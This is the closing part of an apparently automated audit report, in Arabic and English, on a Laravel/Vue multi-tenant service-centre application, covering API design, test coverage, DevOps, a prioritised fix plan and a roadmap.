---

## Stage 8 — API Routes & Contracts

### الأرقام

| فحص | الرقم |
|---|---|
| API routes | 8 |
| API controllers | 4 |
| Throttled endpoints | 3 |
| API Resources (JsonResource) | 0 |
| API versioning | v1 (URL prefix) |
| OpenAPI/Swagger | ❌ |
| Rate limit headers | ❌ |

### 🟠 المشكلة #65: API Resources (JsonResource) غير مستخدمة

**الخطورة:** 🟠 عالية

**الحل:**
```php
class WorkOrderResource extends JsonResource {
    public function toArray($request): array {
        return [
            'id' => $this->id,
            'code' => $this->code,
            'status' => $this->status,
            'status_label' => __("work_orders.status.{$this->status}"),
            // ...
        ];
    }
}
```

### 🟠 المشكلة #66: Inconsistent Error Response Format

(4 formats مختلفة عبر API controllers)

### 🟠 المشكلة #67-70: No Versioning Strategy, No OpenAPI, No Rate Limit Headers, Health Auth

### Stage 8 Score: 65/100

---

## Stage 9 — Testing Coverage

### الأرقام

| فحص | الرقم |
|---|---|
| Test files | 57 |
| Feature tests | 53 |
| Unit tests | **3 فقط** |
| Tenant isolation tests | 6+ |
| AI feature tests | 2 (WorkOrderSuggestion, AiDemo) |
| API endpoint tests | 3 |
| Frontend tests | **0** |
| Coverage reporting | ❌ |

### 🟠 المشكلة #71: 3 Unit Tests فقط (97% من Business Logic غير مختبر)

**الخطورة:** 🟠 عالية

**الـ Services غير مختبرة:**
- `WorkOrderSuggestionService` (765 سطر)
- `InventoryService` (WAC calculation)
- `PaymentService`
- `TwoFactorService`
- 4 Payment Gateways (Tamara, Tabby, Tap, Moyasar)

**الحل:**
```
tests/Unit/Services/
├── WorkOrderSuggestionServiceTest.php
├── InventoryServiceTest.php
├── PaymentServiceTest.php
├── PaymentGateways/
│   ├── TamaraGatewayTest.php
│   ├── TabbyGatewayTest.php
│   ├── TapGatewayTest.php
│   └── MoyasarGatewayTest.php
├── TwoFactorServiceTest.php
└── NotificationServiceTest.php

tests/Unit/Support/
├── PricingHelperTest.php
├── PhoneNumberTest.php
└── TenancyContextTest.php

tests/Unit/Models/
├── WorkOrderTest.php
├── InvoiceTest.php
├── PaymentTest.php
└── ServiceTest.php
```

### 🟠 المشكلة #72: لا يوجد Coverage Report

**الخطورة:** 🟠 عالية

**الحل:**
```xml
<coverage>
    <report>
        <html outputDirectory="coverage"/>
        <text outputFile="php://stdout" showOnlySummary="true"/>
    </report>
</coverage>
```

### 🟠 المشكلة #73: 0 Frontend Tests

(نفس Stage 7)

### 🟠 المشكلة #74: `WorkOrderSuggestionTest` يختبر فقط Happy Path

(سيناريوهات ناقصة)

### 🟡 المشكلة #75-76: Test DB Race Conditions, Tests بدون Factories

### Stage 9 Score: 56/100

---

## Stage 10 — DevOps, Config, Logging

### الأرقام

| فحص | الرقم / الحالة |
|---|---|
| `.env` | موجود (local) |
| `.env.example` | محدّث |
| `APP_DEBUG` | `true` (local) |
| Sentry integration | ✅ مفعّل |
| Structured logging | ✅ JsonFormatter |
| Custom log channels | `ai`, `structured` |
| CI workflow | 1 (`.github/workflows/ci.yml`) |
| Docker | ❌ |
| Backup strategy | ❌ |
| Pre-commit | ✅ Husky |

### 🟠 المشكلة #77-80: Docker, Backup, Env Configs, .env Risk

### 🟡 المشكلة #81-82: Sentry Test, CI Cache

### 🟢 ملاحظات إيجابية

✅ Sentry + Structured Logging  
✅ CI matrix (PHP 8.2, 8.3, 8.4)  
✅ Composer + NPM cache  
✅ Concurrency control  
✅ Pre-commit (Husky)  
✅ `.gitignore` شامل  
✅ Build artifacts upload  
✅ Pint + ESLint + TypeScript check

### Stage 10 Score: 64/100

---

## 🚀 خطة الإصلاح التدريجية

### Quick Wins (هذا الأسبوع — 2-3 أيام)

| # | المهمة | الجهد | الأثر |
|---|---|---|---|
| 1 | XSS Fix في SystemAnnouncementBanner.vue | 5 min | 🔴 حرجة |
| 2 | 2FA fields mass assignment | 30 min | 🟠 عالية |
| 3 | User::phone fallback | 30 min | 🟡 متوسطة |
| 4 | Rate limit على auth routes | 2 ساعة | 🔴 حرجة |
| 5 | Payment type normalization migration | 1 ساعة | 🔴 حرجة |
| 6 | 2 missing composite indexes | 2 ساعة | 🟠 عالية |
| 7 | Add coverage report to CI | 1 ساعة | 🟠 عالية |
| 8 | WorkOrderSuggestionRequest::authorize() | 30 min | 🟠 عالية |
| 9 | Supplier code generation (CenterSequence) | 1 ساعة | 🟠 عالية |
| 10 | 10 critical unit tests | 1 يوم | 🟠 عالية |

### Sprint 1 (شهر واحد — 4 أسابيع)

**أسبوع 1:** XSS, 2FA, Rate limits, Payment types  
**أسبوع 2:** Tenant scope audit + 58 model fix  
**أسبوع 3:** FormRequests extraction (193 → 100)  
**أسبوع 4:** API Resources + Error format standardization  

### Sprint 2-3 (2-3 أشهر)

- Refactor God Controllers (14 controller) → 30-40 controllers
- Refactor God Services (WorkOrderSuggestion, Inventory)
- Expand Actions layer (3 → 20+)
- Frontend tests (0 → 100+)
- Unit tests (3 → 30+)
- API documentation (OpenAPI)

### Sprint 4+ (Roadmap طويل المدى)

- Docker setup
- Backup strategy
- Money/Decimal in cents
- TypeScript migration
- Performance optimization (caching, N+1 fixes)
- Multi-region deployment

---

## 📊 Refactoring Plan (مفصّل)

### Phase A: Security & Bugs (أسبوع 1-2)
```
1. XSS fixes (v-html → v-safe-html)
2. Mass assignment hardening
3. Tenant scope audit (run SecurityScanner)
4. Payment type normalization
5. Rate limiting
6. Add missing composite indexes
```

### Phase B: Architecture (أسبوع 3-6)
```
1. Extract FormRequests (193 → ~50)
2. Convert static services to DI (NotificationService)
3. Split God Controllers (14)
4. Expand Actions (3 → 20+)
5. Add API Resources
6. Standardize error format
```

### Phase C: Performance (أسبوع 7-8)
```
1. Fix N+1 in Customer::show
2. Fix 6-query stats in WorkOrderController
3. Add Cache for tenant-scoped queries
4. Composite indexes
5. Eager loading audit
```

### Phase D: Frontend (أسبوع 9-12)
```
1. Split God Vue files (15+)
2. Add Vitest tests (0 → 50+)
3. TypeScript migration (18 → 100+ files)
4. RTL audit
5. A11y (ARIA) audit
```

### Phase E: DevOps (أسبوع 13-14)
```
1. Docker setup
2. Backup strategy + scheduled jobs
3. Coverage report
4. Deployment strategy
5. Monitoring (uptime, alerts)
```

---

## 🗺️ Roadmap لتحسين المشروع

| Quarter | Focus | KPI |
|---|---|---|
| Q3 2026 | **Security & Bugs** | 0 critical, 0 high |
| Q4 2026 | **Architecture Refactor** | All Controllers < 250 lines |
| Q1 2027 | **Performance & Scale** | 50% reduction in DB queries, 100% tests pass |
| Q2 2027 | **DevOps & DX** | Docker ready, CI/CD pipeline, deployment automation |
| Q3 2027 | **API Platform** | OpenAPI docs, public API tier, mobile app support |
| Q4 2027 | **Multi-Region** | Region-aware tenancy, data residency compliance |

---

## 💡 Strengths (ما عنده ممتاز)

- ✅ Multi-tenant defense-in-depth (TenantScoped + CenterScoped traits)
- ✅ Policy-based authorization (27 policies)
- ✅ 2FA إلزامي + Phone OTP (multi-layer)
- ✅ Sentry + Structured Logging (JsonFormatter مع correlation_id)
- ✅ AI Service Design (defense-in-depth، pre-filter total_candidates)
- ✅ 7 Security Scanners (Architecture, BusinessLogic, Database, Performance, Security, Test, UI)
- ✅ 208 Migrations (تطور مدروس، MySQL + SQLite compatible)
- ✅ Soft Deletes موحّد
- ✅ Decimal precision للـ financial fields
- ✅ DOMPurify integration (v-safe-html)
- ✅ CI matrix (PHP 8.2, 8.3, 8.4)
- ✅ Husky pre-commit hooks
- ✅ Composables pattern (11 composable)
- ✅ SafeHtmlPlugin (global v-safe-html directive)
- ✅ vue-i18n (AR/EN localization)
- ✅ TrackAiUsage middleware (fail-closed)

---

## ⚠️ Weaknesses (يحتاج انتباه)

- 🔴 **53% من Models بدون tenant scope** — أكبر ثغرة
- 🔴 **0 Frontend tests** — لا regression protection
- 🔴 **15 Vue files > 1000 سطر** — God pages
- 🟠 **14 Controllers > 250 سطر** — God controllers
- 🟠 **193 inline validations** — FormRequests ناقصة
- 🟠 **68 controllers بدون authorize** — Policy gaps
- 🟠 **0 API documentation** — OpenAPI/Swagger
- 🟠 **0 Backup strategy** — Data at risk
- 🟠 **No Docker** — DevOps friction
- 🟠 **Static services** (NotificationService) — Testability
- 🟠 **Mixed-case payment types** — Data inconsistency

---

## 🎯 التوصية النهائية

يا أحمد، المشروع عنده **foundation ممتاز** (Sentry, 2FA, multi-tenant, structured logging, security scanners) لكن عنده **technical debt كبير** يحتاج معالجة.

**الـ Quick Wins** (هذا الأسبوع) راح تحل 40% من المشاكل الحرجة بـ 2-3 أيام عمل. ابدأ بـ:

1. **XSS في SystemAnnouncementBanner** (5 min)
2. **2FA mass assignment** (30 min)
3. **Payment type migration** (1 ساعة)
4. **Rate limits** (2 ساعة)
5. **10 critical unit tests** (1 يوم)

بعدها تقدر تنام مرتاح البال إن الـ production deploy ما راح يتفجّر بـ XSS أو data corruption.

**الـ 3-شهر roadmap** راح تنقل المشروع من 63.5/100 إلى 85/100+.

---

## ملخص إحصائي نهائي

| البُعد | الرقم |
|---|---|
| إجمالي المشاكل المكتشفة | **76** |
| مشاكل حرجة (Critical) | **13** |
| مشاكل عالية (High) | **25** |
| مشاكل متوسطة (Medium) | **38** |
| إجمالي الجهد التقديري | **30-40 يوم عمل** |
| الدرجة الحالية | **63.5/100** |
| الدرجة المستهدفة بعد Quick Wins | **70/100** |
| الدرجة المستهدفة بعد Sprint 2-3 | **80/100** |
| الدرجة المستهدفة بعد Phase E | **85+/100** |

---

**تم إعداد التقرير بتاريخ:** 2026-07-20
**المُعد:** Mavis (Smart Deep Project Audit)
**Branch:** `integration/p0-print-settings`
**المشروع:** Carag V2 (Khidmh Pro)
